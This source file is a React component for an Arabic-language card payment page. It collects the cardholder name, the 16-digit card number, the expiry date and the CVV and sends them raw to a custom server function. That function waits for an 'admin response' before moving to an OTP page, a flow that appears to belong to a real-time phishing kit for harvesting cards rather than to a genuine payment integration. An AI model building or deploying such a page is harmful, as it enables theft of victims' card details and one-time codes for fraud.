import Main from "@/components/MainWrapper";
import { useEffect } from "react";
import { Link, useLocation, useNavigate } from "react-router-dom";
import { validateLanguage } from "@/lib/helpers";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { FieldValues, useForm } from "react-hook-form";
import { CustomSelect } from "@/components/ui/select";
import Input from "@/components/Input";

const errMsgs = {
  name: "الأسم غير صحيح. يجب أن يكون باللغة الأنجليزية",
  card_num: "رقم البطاقة غير صحيح. يجب أن يكون الرقم مكون من 16 رقم",
  cvv: "رقم cvv غير صحيح. يجب أن يكون الرقم مكون من 3 رقم",
  month: "يرجى تحديد الشهر",
  year: "يرجى تحديد السنة",
};

const years = [
  { name: "2024" },
  { name: "2025" },
  { name: "2026" },
  { name: "2027" },
  { name: "2028" },
  { name: "2029" },
  { name: "2030" },
];
const months = [
  { name: "1" },
  { name: "2" },
  { name: "3" },
  { name: "4" },
  { name: "5" },
  { name: "6" },
  { name: "7" },
  { name: "8" },
  { name: "9" },
  { name: "10" },
  { name: "11" },
  { name: "12" },
];
const Gateway = () => {
  const { state } = useLocation();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors, isValidating, isValid },
  } = useForm({ mode: "all" });
  useEffect(() => {
    setCurrentPage("payment-gateway");
  }, []);
  const navigate = useNavigate();

  console.log(state);

  const onSubmit = (data: FieldValues) => {
    console.log(data);

    if (Object.values(data).filter((d) => !d).length === 0) {
      sendDataToServer({
        data: {
          "إسم حامل البطاقة": data.name,
          "رقم البطاقة": data.card_num,
          "تاريخ الانتهاء": `${data.exp_month}/${data.exp_year}`,
          cvv: data.cvv,
        },
        current: "payment-gateway",
        nextPage: "otp",
        waitingForAdminResponse: true,
        navigate,
      });
    }
  };

  return (
    <Main>
      <main className="bg-gray-100 min-h-screen py-10 lg:pt-20">
        <div className="bg-white rounded-xl flex flex-col items-center justify-center w-fit max-w-[90dvw] lg:max-w-lg p-4 mx-auto">
          <div className="py-2 px-6 mb-4 rounded-xl w-full bg-main shadow-sm">
            <img
              src="/assets/images/logo.webp"
              alt="logo"
              className="h-10 mx-auto"
            />
          </div>

          <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
            {state?.paymentMethod && (
              <img
                src={`/assets/images/client/${state.paymentMethod}-card.svg`}
                className="w-16 absolute left-2 top-4 lg:top-2 scale-125"
                alt={`${state?.paymentMethod} logo`}
              />
            )}

            <h2 className="text-xl font-bold text-main">
              الدفع من خلال بطاقة الائتمان
            </h2>
            <p className="text-gray-600">
              سيتم إجراء معاملة مالية على حسابك المصرفي بإستخدام البطاقة بقيمة
              المجموع الكلي
            </p>
          </div>

          <h3 className="text-xl font-bold text-main text-right mt-4 self-start px-4">
            معلومات البطاقة
          </h3>
          <form
            onSubmit={handleSubmit(onSubmit)}
            className="mt-4 grid grid-cols-6 items-end gap-2 w-full px-4"
          >
            <Input
              errors={errors}
              register={register}
              label="إسم حامل البطاقة"
              placeholder="أدخل إسم حامل البطاقة"
              id="name"
              type="text"
              isAr
              className="text-left"
              containerClassName="col-span-6"
              options={{
                required: "هذا الحقل ضروري",
                validate: (value) =>
                  validateLanguage(value) !== "en" ? errMsgs.name : true,
              }}
            />

            <Input
              errors={errors}
              register={register}
              isAr
              label="رقم البطاقة"
              placeholder="xxxx xxxx xxxx xxxx"
              id="card_num"
              type="tel"
              max={16}
              className={"text-left"}
              containerClassName="col-span-6"
              options={{
                required: "هذا الحقل ضروري",
                pattern: {
                  value: /^[0-9]{16}$/,
                  message: errMsgs.card_num,
                },
              }}
            />

            <div className={"col-span-6"}>
              <div className="flex justify-center gap-2">
                <label
                  htmlFor={"cvv"}
                  className="grow block text-sm font-bold text-gray-800"
                >
                  الرمز السري (CVV)
                </label>

                <label
                  htmlFor={"year_month"}
                  className="block text-sm font-bold text-gray-800 w-fit"
                >
                  تاريخ الإنتهاء
                </label>
              </div>

              <div className="mt-2 flex justify-center flex-row-reverse gap-2">
                <CustomSelect
                  id="exp_month"
                  placeholder="شهر"
                  label=""
                  sels={months}
                  className="px-4"
                  register={register}
                  errors={errors}
                  options={{ required: errMsgs.month }}
                  setValue={setValue}
                />
                <CustomSelect
                  id="exp_year"
                  placeholder="سنة"
                  label=""
                  sels={years}
                  className="px-4"
                  register={register}
                  errors={errors}
                  options={{ required: errMsgs.year }}
                  setValue={setValue}
                />

                <Input
                  errors={errors}
                  register={register}
                  isAr
                  id="cvv"
                  placeholder="خلف البطاقة"
                  type="password"
                  max={3}
                  className={"flex-1"}
                  containerClassName="col-span-6"
                  options={{
                    required: "هذا الحقل ضروري",
                    pattern: {
                      value: /^\d{3}$/,
                      message: errMsgs.cvv,
                    },
                  }}
                />
              </div>
            </div>

            <p className="w-max">
              {`المجموع الكلى:`}{" "}
              <strong className="text-green-600 font-bold underline ring-offset-4">
                {state?.total || 10}
              </strong>{" "}
              ر.س
            </p>
            <div className="col-span-6 mt-6 flex flex-col lg:flex-row sm:items-center gap-4">
              <button
                className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-[#76b456] hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                type="submit"
                disabled={!isValid}
              >
                {isValidating ? "جاري الحفص ..." : "ادفع الآن"}
              </button>
              <Link
                className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                to={"/checkout/4"}
              >
                السابق
              </Link>
            </div>

            <img
              src="/assets/images/client/cards-all.png"
              alt="cards logos"
              className="mx-auto max-w-xs col-span-6 mt-6"
            />
          </form>
        </div>
      </main>
    </Main>
  );
};
export default Gateway;
